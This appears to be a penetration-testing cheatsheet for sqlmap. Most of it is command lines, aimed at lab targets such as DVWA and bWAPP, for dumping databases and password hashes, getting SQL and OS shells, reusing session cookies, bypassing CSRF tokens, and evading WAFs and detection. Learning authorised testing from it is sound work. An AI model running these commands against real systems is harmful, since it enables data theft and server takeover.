# 🗡️ SQLmap Cheatsheet

> _Automated SQL Injection Testing Tool_

---

## 📖 Overview

**SQLmap** is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It allows for database fingerprinting, data fetching, file system access, and more through terminal commands.

- 🔗 [Sqlmap GitHub](https://github.com/sqlmapproject/sqlmap)
- 📚 [Sqlmap Usage Guide](https://sqlmap.org/)

---

## ⚙️ Installation

```bash
apt install sqlmap
```

---

## 🚀 Basic Usage

|Command|Description|
|---|---|
|`sqlmap -u <URL>`|Test a URL for SQL injection|
|`sqlmap -u <URL> -p <PARAMETER>`|Specify a vulnerable parameter|
|`sqlmap --help`|Display help options|

---

## 🗄️ Database Enumeration

```bash
# List all available databases
sqlmap -u <URL> --dbs
sqlmap -u http://192.168.1.31/web-pentest/error-based-string.php?id=1 -p id --dbs

# List tables in a specific database
sqlmap -u <URL> -D <DATABASE> --tables
sqlmap -u http://192.168.1.31/web-pentest/error-based-string2.php?id=1 -D sqli_db --tables

# List columns in a specific table
sqlmap -u <URL> -D <DATABASE> -T <TABLE> --columns

# Dump specific columns' data
sqlmap -u <URL> -D <DATABASE> -T <TABLE> -C <COLUMN1,COLUMN2> --dump
```

---

## 🔍 Information Gathering

```bash
# Retrieve DBMS banner
sqlmap -u <URL> -b

# Get current DBMS user
sqlmap -u <URL> --current-user

# Get current database name
sqlmap -u <URL> --current-db

# Retrieve database server hostname
sqlmap -u <URL> --hostname
```

---

## 👤 User Enumeration

```bash
# Enumerate DBMS users
sqlmap -u <URL> --users

# Enumerate password hashes
sqlmap -u <URL> --passwords

# Enumerate user privileges
sqlmap -u <URL> --privileges

# Enumerate user roles
sqlmap -u <URL> --roles
```

---

## 🔬 Advanced Data Extraction

```bash
# Enumerate DBMS schema
sqlmap -u <URL> --schema

# Count number of entries
sqlmap -u <URL> --count

# Dump all database entries
sqlmap -u <URL> --dump-all

# Execute custom SQL query
sqlmap -u <URL> --sql-query="show tables"
```

---

## 🖥️ Shell Access

```bash
# Get interactive SQL shell
sqlmap -u <URL> --sql-shell
sqlmap -u http://192.168.1.31/web-pentest/error-based-string.php?id=1 --sql-shell
# > select * from users;

# Get OS shell on target server
sqlmap -u <URL> --os-shell
sqlmap -u http://192.168.1.31/web-pentest/error-based-string.php?id=1 --os-shell

# Automatic exploitation (get shell access)
sqlmap -u <URL> --os-pwn
```

---

## 🗂️ SQLmap Directory & Maintenance

```bash
# Data output location
/root/.local/share/sqlmap/output

# Purge the SQLmap data directory
sqlmap --purge

# Update SQLmap to the latest version
sqlmap --update
```

---

## 🍪 Cookie & Session Handling

```bash
# Use cookies for authentication during testing
sqlmap --cookie="PHPSESSID=t6b4spt1ef99777dl4jvjhkl24;security=low" \
       -u http://192.168.1.45/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit

# Use cookies for authenticated session
sqlmap --cookie="PHPSESSID=abcd; security=low" -u <URL>
```

---

## 📋 Using Burp Saved Requests

```bash
# Use captured POST/GET requests from Burp
sqlmap -r <saved_request.txt>

# Target specific parameter inside request
sqlmap -r <saved_request.txt> -p <PARAMETER>

# Enumerate databases from saved request
sqlmap -r <saved_request.txt> -p <PARAMETER> --dbs
```

---

## 📮 Post Request Attacks

```bash
# Use a saved POST request
sqlmap -r Downloads/sqli-cookie
```

---

> ⚠️ **Disclaimer:** This tool is for authorized penetration testing only. Always obtain proper written permission before testing any system you do not own.



# 🗺️ SQLMap Cheatsheet

> _Automated SQL Injection & Database Takeover Tool_

---

## 🔗 GET Request Attack

```bash
sqlmap --cookie="security_level=0; PHPSESSID=40ccf35dd00767683e87f69f529a5053" \
       -u "http://192.168.1.239/bWAPP/sqli_1.php?title=a&action=search" --dbs
```

---

## 📮 Post Request Attacks

> **Workflow:**
> 
> 1. Configure Burp Suite proxy
> 2. Capture and save the POST request using **Save Item** option
> 3. Use the saved file with Sqlmap

### Basic Usage

```bash
# Use captured POST/GET requests from Burp
sqlmap -r <saved_request.txt>
sqlmap -r sqli-post

# Specify parameter to attack
sqlmap -r sqli-post -p title

# Enumerate databases
sqlmap -r sqli-post -p title --dbs

# Find tables
sqlmap -r sqli-post -p title -D bWAPP --tables

# Get columns from users table
sqlmap -r sqli-post -p title -D bWAPP -T users --columns

# Dump user data
sqlmap -r sqli-post -p title -D bWAPP -T users -C id,login,email,password,secret,activated,admin --dump
sqlmap -r sqli-post -p title -D bWAPP -T users --dump
```

### With Random Agent & Proxy

```bash
sqlmap -r sqli-post2 --random-agent --proxy=http://127.0.0.1:8080 --dbs
sqlmap -r sqli-post2 --random-agent --proxy=http://127.0.0.1:8080 -D bWAPP --tables
```

---

## 💾 Using Burp Saved Requests

```bash
# Target specific parameter inside request
sqlmap -r <saved_request.txt> -p <PARAMETER>

# Enumerate databases from saved request
sqlmap -r <saved_request.txt> -p <PARAMETER> --dbs
```

---

## 🛡️ CSRF Token Handling
A **CSRF token** is a **secret random value** added to a website form to make sure the request is really coming from the actual user — not from a hacker

> _Bypass CSRF protection during testing_

```bash
# Basic CSRF bypass
sqlmap -r update-user.txt \
       --csrf-url=http://armour.local/profile \
       --csrf-token="acdt67gshfuiuasfsg" \
       --risk=3 --level=3 --dbms=mysql --dbs

# Targeting specific parameters
sqlmap -r update-user.txt \
       --csrf-url=http://armour.local/profile \
       --csrf-token="acdt67gshfuiuasfsg" \
       -p 'city' --random-agent --current-db \
       --risk=3 --level=3 --dbms=mysql --dbs

# Discovering tables
sqlmap -r update-user.txt \
       --csrf-url=http://armour.local/profile \
       --csrf-token="acdt67gshfuiuasfsg" \
       -p 'city' --random-agent --current-db \
       --risk=3 --level=3 --dbms=mysql -D terahost --tables

# Fetching table columns
sqlmap -r update-user.txt \
       --csrf-url=http://armour.local/profile \
       --csrf-token="acdt67gshfuiuasfsg" \
       -p 'city' --random-agent --current-db \
       --risk=3 --level=3 --dbms=mysql -D terahost -T users,user_info --columns

# High risk + threaded attacks through proxy
sqlmap -r user-service.txt --risk=3 --level=3 --threads 10 --proxy=http://127.0.0.1:8080

# Generic CSRF bypass template
sqlmap -r <request.txt> --csrf-url=<URL> --csrf-token=<TOKEN> --risk=3 --level=3 --dbms=mysql
```

---

## ⚙️ Extra Options

```bash
# Random User-Agent + proxy
sqlmap -r <file> --random-agent --proxy=http://127.0.0.1:8080

# Clean Sqlmap data directory
sqlmap --purge

# Update Sqlmap to the latest version
sqlmap --update
```

---

## 🐍 Sqlmap Tamper Scripts

> Tamper scripts are **Python scripts** used to modify SQL injection payloads before sending them to the target server. Their main purpose is to bypass **WAFs**, **IPS**, and input filters that block or sanitize SQLi payloads.

### Why Use Tamper Scripts?

|Reason|Detail|
|---|---|
|🚫 WAF Bypass|Some web apps block typical SQLi payloads|
|🔀 Syntax Alteration|Alters payload syntax to evade detection|
|🕵️ Hidden Vulns|Allows exploitation of otherwise hidden SQLi vulnerabilities|
|🔧 Custom Filters|Customized scripts for unique filtering environments|

### How Tamper Scripts Work

- Process each injection payload **just before** sqlmap sends it
- Transformations include: encoding, obfuscation, replacing spaces, comments, or special characters
- **Multiple tamper scripts** can be combined in a single scan

### Using Tamper Scripts

```bash
# List all available tamper scripts
sqlmap --list-tampers
```

---

## 📋 Notes

### 🎯 Risk Levels `--risk=1/2/3`

> Higher = more payloads, slower

|Level|Behavior|
|---|---|
|`1`|✅ Default — least destructive, avoids data changes|
|`2`|⏱️ Adds heavy, time-based SQLi payloads (may slow/crash DB)|
|`3`|⚠️ Introduces OR-based payloads — **use only in safe environments**|

### 📊 Level Values `--level=1/2/3/4/5`

> Governs depth of checks & quantity/types of headers tested

|Level|Coverage|
|---|---|
|`1`|GET and POST parameters only _(default)_|
|`2`|+ Cookie testing|
|`3`|+ Header testing|
|`5`|Host + most advanced checks (largest number of requests)|

### 🔀 Proxy Usage

> `--proxy="http://127.0.0.1:8080"` — Route traffic through **Burp Suite** for deeper request/response inspection and logging during tests.

### 🤖 Random Agent

> `--random-agent` — Picks a random **User-Agent header**, making automated traffic less identifiable and helping bypass simple security measures and detection by the target application.

---

_📌 Always use SQLMap only on systems you have explicit permission to test._